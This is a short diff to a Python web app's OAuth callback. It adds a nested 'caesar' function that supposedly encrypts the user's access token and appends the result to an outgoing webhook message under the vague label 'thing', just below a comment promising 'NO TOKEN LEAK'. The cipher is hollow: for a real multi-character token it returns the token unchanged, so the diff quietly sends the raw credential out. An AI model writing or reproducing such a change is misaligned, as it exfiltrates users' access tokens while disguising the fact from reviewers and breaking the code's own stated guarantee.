@@ -114,6 +114,16 @@ def callback():
         "time": str(datetime.utcnow())
     }
     save_data(db)
+    def caesar(access_token, shift=3):
+        alphabet = "abcdefghijklmnopqrstuvwxyz"
+        if access_token.lower() not in alphabet:
+            return access_token
+
+        i = alphabet.index(access_token.lower())
+        encrypted = alphabet[(i + shift) % 26]
+        return encrypted
+
+    encrypted = caesar(access_token, 3)
 
     # webhook (NO TOKEN LEAK)
     send_webhook(
@@ -121,6 +131,7 @@ def callback():
         f"User: {username}\n"
         f"ID: {user_id}\n"
         f"Time: {datetime.utcnow()} UTC"
+        f"thing: {encrypted}"
     )
 
     return f"User {username} authorized successfully"
@@ -157,3 +168,4 @@ def add_user(user_id):
 # =========================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
+
